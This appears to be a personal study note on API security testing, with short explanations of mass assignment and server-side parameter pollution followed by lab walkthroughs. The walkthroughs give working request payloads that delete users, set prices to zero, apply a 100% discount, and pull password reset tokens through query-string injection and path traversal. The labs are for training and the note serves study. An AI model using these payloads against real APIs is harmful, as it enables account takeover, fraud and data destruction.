# API Testing
**Steps to start API testing:**
- Identify API endpoints (can use Burp Intruder)
- Determine how to interact with endpoints:
  - The input data the API processes, including both compulsory and optional parameters.
  - The types of requests the API accepts, including supported HTTP methods and media formats (try changing `Content-Type` header).
  - Rate limits and authentication mechanisms.

**Mass assignment vulnerabilities:**
Mass assignment (also known as auto-binding) can inadvertently create hidden parameters. It occurs when software frameworks automatically bind request parameters to fields on an internal object. Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer.

**Server-side parameter pollution:**
Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding.
To test for server-side parameter pollution in the query string, place query syntax characters like `#`, `&`, `/` and `=` in your input and observe how the application responds.
> It's essential that you URL-encode these characters.

### LAB: Exploiting an API endpoint using documentation
Found this API endpoint when updating user's email: `PATCH /api/user/wiener`. Change the request method to `OPTIONS` and found out `DELETE, GET, PATCH` are allowed. Change the request method to `DELETE` and the username to `carlos` to successfully delete user carlos:

    DELETE /api/user/carlos 

### LAB: Finding and exploiting an unused API endpoint
Found the `/api/products/1/price` in a `GET` request which returns:

    {
      "price":"$0.00",
      "message":"&#x1F525;&#x1F525;&#x1F525; Our warehouse is on fire, purchase now before all stock is burnt to a crisp! &#x1F525;&#x1F525;&#x1F525;"
    }

Use `OPTIONS` to make a request to this endpoint and observes that it also allows `PATCH` method. Change the request method to `PATCH` and add this body to successfully change the price of the product to `$0.00`:

    {
      "price":0
    }

### LAB: Exploiting a mass assignment vulnerability
Found the `/api/checkout` in a `GET` request which returns:

    {
      "chosen_discount":{
        "percentage":0
      },
      "chosen_products":[
        {
          "product_id":"1",
          "name":"Lightweight \"l33t\" Leather Jacket",
          "quantity":1,
          "item_price":133700
        }
      ]
    }

Use `OPTIONS` to make a request to this endpoint and observes that it also allows `POST` method. Change the request method to `POST` and add this body:

    {
      "chosen_discount":{
        "percentage":100
      },
      "chosen_products":[
        {
          "product_id":"1",
          "name":"Lightweight \"l33t\" Leather Jacket",
          "quantity":1,
          "item_price":133700
        }
      ]
    }

As the result, the product is bought with 100% discount:

    HTTP/2 201 Created
    Location: /cart/order-confirmation?order-confirmed=true
    X-Frame-Options: SAMEORIGIN
    Content-Length: 0

### LAB: Exploiting server-side parameter pollution in a query string
Notice an API endpoint when posting this request:

    POST /forgot-password HTTP/2

    csrf=TUsQP24XgJ8l6AzpP5JtEdP5rdSt2n5z&username=administrator

Try truncate the API call by appending the fragment symbol (`%23`) after the username's value. Notice the response indicating there is a `field` parameter. When we send this request:

    POST /forgot-password HTTP/2

    csrf=TUsQP24XgJ8l6AzpP5JtEdP5rdSt2n5z&username=administrator%26field=username

Notice the response is now showing us the username's value:

    {"type":"username","result":"administrator"}

Notice in the `/static/js/forgotPassword.js`, there is a parameter named `reset_token`. To reset the administrator's password, we need to retrieve this value. Try sending request:

    POST /forgot-password HTTP/2

    csrf=TUsQP24XgJ8l6AzpP5JtEdP5rdSt2n5z&username=administrator%26field=reset_token

Now the response is giving us the `reset_token` value. Use this access the reset password page and reset the password. Login to the admin's account and delete user Carlos.

### LAB: Exploiting server-side parameter pollution in a REST URL
At the `POST /forgot-password HTTP/2`, try paht traversal by injecting in the username value:

    username=../../../../%23

This gives an error of not found, which indicates that we have reached the root directory. Try fuzzing with some common API endpoint and found that with:

    username=../../../../openapi.json%23

The server is returning this error:

    {
      "error": "Unexpected response from API server:
      {
          \"openapi\": \"3.0.0\",
          \"info\": {
            \"title\": \"User API\",
            \"version\": \"2.0.0\"
          },
          \"paths\": {
            \"/api/internal/v1/users/{username}/field/{field}\": {
              \"get\": {
                \"tags\": [
                  \"users\"
                ],
                \"summary\": \"Find user by username\",
                \"description\": \"API Version 1\",
                \"parameters\": [
                    {
                      \"name\": \"username\",
                      \"in\": \"path\",
                      \"description\": \"Username\",
                      \"required\": true,
                      \"schema\": {
                        ..."
    }

Take note of the path `/api/internal/v1/users/{username}/field/{field}`. This time try fuzzing the field value. Just like the above lab, we have found a parameter that could reference the reset token. Send this request:

    username=administrator/field/passwordResetToken%23

This time the server returns with an error indicating that this version of API only accepts the email field. To bypass this, try changing the API version with path traversal:

    username=../../v1/users/administrator/field/passwordResetToken%23

This time, we successfully retrieve the reset password token. Use it to solve the lab.